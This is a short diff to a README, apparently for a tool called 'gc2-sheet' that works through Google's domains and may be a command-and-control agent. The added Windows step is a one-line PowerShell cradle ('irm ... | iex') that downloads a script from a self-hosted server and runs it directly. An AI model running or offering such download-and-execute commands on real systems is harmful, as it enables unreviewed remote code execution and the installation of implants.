@@ -71,7 +71,12 @@ Furthermore, the program will interact only with Google's domains (*.google.com)
 
 7. **Run**
 
-    If the configuration file has been modified just run:
+   If you have a web server hosting your MY_KEY_JSON file and running on Windows, use:
+   ```Powershell
+   irm http://$myUrl/PowershellScript-GC-2.ps1 | iex
+   ```
+
+   Or Linux the below commands. If the configuration file has been modified just run:
 
     ```
     ./gc2-sheet
